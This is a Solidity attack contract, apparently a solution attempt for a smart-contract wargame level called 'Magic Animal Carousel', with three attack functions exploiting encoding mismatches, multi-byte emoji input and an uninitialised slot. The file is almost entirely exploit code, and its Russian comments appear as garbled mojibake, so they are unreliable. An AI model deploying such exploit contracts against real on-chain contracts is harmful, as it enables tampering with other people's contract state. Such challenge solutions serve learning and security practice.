// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;

    function changeAnimal(string calldata animal, uint256 crateId) external;

    function carousel(uint256 crateId) external view returns (uint256);

    function currentCrateId() external view returns (uint256);

    function encodeAnimalName(
        string calldata animalName
    ) external pure returns (uint256);
}

contract CarouselAttack {
    IMagicAnimalCarousel public carousel;

    constructor(address _carouselAddress) {
        carousel = IMagicAnimalCarousel(_carouselAddress);
    }

    function attack() external {
        // –®–∞–≥ 1: –î–æ–±–∞–≤–ª—è–µ–º –∂–∏–≤–æ—Ç–Ω–æ–µ —á–µ—Ä–µ–∑ setAnimalAndSpin
        carousel.setAnimalAndSpin("Wolf");

        // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π ID —è—á–µ–π–∫–∏, –∫—É–¥–∞ –±—ã–ª–æ –ø–æ–º–µ—â–µ–Ω–æ –Ω–∞—à–µ –∂–∏–≤–æ—Ç–Ω–æ–µ
        uint256 crateId = carousel.currentCrateId();

        // –®–∞–≥ 2: –ò–∑–º–µ–Ω—è–µ–º –∂–∏–≤–æ—Ç–Ω–æ–µ —á–µ—Ä–µ–∑ changeAnimal, –∏—Å–ø–æ–ª—å–∑—É—è –Ω–µ—Å–æ–≥–ª–∞—Å–æ–≤–∞–Ω–Ω–æ—Å—Ç—å –≤ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–∏
        // –§—É–Ω–∫—Ü–∏—è changeAnimal –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥—Ä—É–≥—É—é –ª–æ–≥–∏–∫—É –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è, —á–µ–º setAnimalAndSpin
        carousel.changeAnimal("Tiger", crateId);

        // –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –∫–æ–¥–∏—Ä–æ–≤–∫–∞ –∂–∏–≤–æ—Ç–Ω–æ–≥–æ –±—É–¥–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –æ—Ç –æ–∂–∏–¥–∞–µ–º–æ–π,
        // –Ω–∞—Ä—É—à–∞—è "–º–∞–≥–∏—á–µ—Å–∫–æ–µ –ø—Ä–∞–≤–∏–ª–æ –∫–∞—Ä—É—Å–µ–ª–∏"
    }

    // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∞—è –∞—Ç–∞–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º UTF-8 —Å–∏–º–≤–æ–ª–æ–≤
    function attackWithUTF8() external {
        // –®–∞–≥ 1: –î–æ–±–∞–≤–ª—è–µ–º –∂–∏–≤–æ—Ç–Ω–æ–µ
        carousel.setAnimalAndSpin("Cat");

        // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π ID —è—á–µ–π–∫–∏
        uint256 crateId = carousel.currentCrateId();

        // –®–∞–≥ 2: –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å—Ç—Ä–æ–∫—É —Å —ç–º–æ–¥–∑–∏, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–Ω–∏–º–∞—é—Ç –±–æ–ª—å—à–µ –±–∞–π—Ç–æ–≤, —á–µ–º –∫–∞–∂–µ—Ç—Å—è
        // –≠—Ç–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ—Ç –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É UTF-8 —Å–∏–º–≤–æ–ª–æ–≤
        string memory specialAnimal = unicode"ü¶Ñüêâü¶ä"; // –ö–∞–∂–¥—ã–π —ç–º–æ–¥–∑–∏ –∑–∞–Ω–∏–º–∞–µ—Ç 4 –±–∞–π—Ç–∞
        carousel.changeAnimal(specialAnimal, crateId);
    }

    // –ê—Ç–∞–∫–∞ –Ω–∞ –ø—É—Å—Ç–æ–π —Å–ª–æ—Ç
    function attackEmptySlot() external {
        // –í—ã–±–∏—Ä–∞–µ–º –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π —Å–ª–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –±—ã–ª –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω
        uint256 emptySlotId = 999;

        // –ù–∞–ø—Ä—è–º—É—é –∏–∑–º–µ–Ω—è–µ–º –∂–∏–≤–æ—Ç–Ω–æ–µ –≤ –ø—É—Å—Ç–æ–º —Å–ª–æ—Ç–µ
        carousel.changeAnimal("Snake", emptySlotId);

        // –¢–µ–ø–µ—Ä—å —Å–ª–æ—Ç –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É, —Ö–æ—Ç—è –æ–Ω –Ω–µ –±—ã–ª –ø—Ä–∞–≤–∏–ª—å–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∫–∞—Ä—É—Å–µ–ª—å
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏
    function verifyAttack(uint256 crateId) external view returns (uint256) {
        return carousel.carousel(crateId);
    }
}
